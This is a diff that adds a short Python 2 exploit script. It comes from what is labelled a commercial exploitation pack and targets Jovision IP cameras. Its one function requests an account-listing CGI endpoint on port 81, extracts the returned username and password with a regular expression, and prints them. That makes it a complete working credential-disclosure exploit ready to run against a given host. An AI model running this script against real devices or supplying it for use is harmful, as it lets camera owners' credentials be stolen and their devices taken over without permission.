@@ -1,0 +1,44 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_jovision_1'
+_vendor_ = 'jovision'
+_model_  = ['Camera']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://habr.com/ru/post/318572/'
+_port_   = 81
+
+def pwnrouter(host,port=_port_):  
+  try:
+    url = 'http://%s:%d/cgi-bin/jvsweb.cgi?cmd=account&action=list' % (host,port)        
+    response = requests.get(url, allow_redirects=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+    return   
+  m = re.search('"acID":\\s*"([^"]+)",\\s*"acPW":\\s*"([^"]+)"', response.text)
+  if m is None:
+    print '[+] %s not vulnerable' % host
+    return                
+  print '[+] %s vulnerable' % host
+  print '[+] Username: %s'%m.group(1).encode('utf-8')
+  print '[+] Password: %s'%m.group(2).encode('utf-8')        
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
